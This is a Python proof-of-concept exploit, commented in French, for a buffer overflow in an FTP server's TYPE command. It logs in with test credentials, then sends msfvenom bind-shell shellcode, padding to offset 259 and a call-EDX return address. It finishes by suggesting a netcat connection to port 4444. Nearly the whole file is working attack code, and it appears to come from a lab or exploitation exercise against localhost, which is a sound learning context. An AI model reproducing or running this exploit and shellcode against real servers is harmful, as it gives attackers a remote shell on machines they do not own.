#!/usr/bin/env python3
import socket
import struct

# Configuration
TARGET = "127.0.0.1"
PORT = 21

def create_exploit():
    # Adresse d'une instruction qui utilise EDX (À TROUVER avec objdump)
    # Exemple : si vous trouvez "call *%edx" à 0x08048xxx
    call_edx_addr = 0x80493c2

    # Shellcode simple bind shell (port 4444)
    # msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -b '\x00\x0a\x0d\x20' -f python
    shellcode =  b""
    shellcode += b"\xbb\xfe\xef\xf9\xda\xdb\xc1\xd9\x74\x24\xf4\x5e"
    shellcode += b"\x33\xc9\xb1\x14\x83\xee\xfc\x31\x5e\x10\x03\x5e"
    shellcode += b"\x10\x1c\x1a\xc8\x01\x17\x06\x78\xf5\x84\xa3\x7d"
    shellcode += b"\x70\xcb\x84\xe4\x4f\x8b\xbe\xb6\x1d\xe3\x42\x47"
    shellcode += b"\xb3\xaf\x28\x57\xe2\x1f\x24\xb6\x6e\xf9\x6e\xf4"
    shellcode += b"\xef\x8c\xce\x02\x43\x8a\x60\x6c\x6e\x12\xc3\xc1"
    shellcode += b"\x16\xdf\x44\xb2\x8e\xb5\x7b\xed\xfd\xc9\xcd\x74"
    shellcode += b"\x06\xa1\xe2\xa9\x85\x59\x95\x9a\x0b\xf0\x0b\x6c"
    shellcode += b"\x28\x52\x87\xe7\x4e\xe2\x2c\x35\x10"

    # Construction : shellcode + padding + adresse de retour
    offset = 259
    padding_size = offset - len(shellcode)

    if padding_size < 0:
        print("[-] Shellcode trop long !")
        return None

    exploit = shellcode + b"A" * padding_size + struct.pack("<I", call_edx_addr)
    return exploit

def send_exploit():
    print("[*] Création de l'exploit...")
    payload = create_exploit()

    if not payload:
        return

    print(f"[*] Taille payload: {len(payload)} octets")
    print("[*] Connexion au serveur FTP...")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))

        # Bannière
        banner = s.recv(1024)
        print(f"[+] {banner.decode().strip()}")

        # Auth
        s.send(b"USER test\r\n")
        resp = s.recv(1024)
        print(f"[+] {resp.decode().strip()}")

        s.send(b"PASS test\r\n")
        resp = s.recv(1024)
        print(f"[+] {resp.decode().strip()}")

        print("[*] Envoi de l'exploit...")
        s.send(b"TYPE " + payload + b"\r\n")

        print("[+] Exploit envoyé !")
        print("[*] Si bind shell: nc TARGET_IP 4444")

    except Exception as e:
        print(f"[-] Erreur: {e}")
    finally:
        try:
            s.close()
        except:
            pass

if __name__ == "__main__":
    print("=== POC Exploit TYPE buffer Overflow ===")
    print("[!] N'oubliez pas de remplacer call_edx_addr !")
    send_exploit()

